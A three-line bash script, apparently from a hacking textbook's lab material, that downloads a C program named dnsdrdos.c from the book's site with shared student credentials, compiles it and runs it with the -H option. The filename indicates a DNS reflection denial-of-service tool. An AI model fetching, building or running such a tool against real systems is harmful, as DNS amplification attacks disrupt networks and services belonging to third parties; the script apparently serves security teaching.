#!/bin/bash
wget --user=student --password=student https://www.hackerhousebook.com/files/dnsdrdos.c
gcc dnsdrdos.c -o xdnsdos
./xdnsdos -H
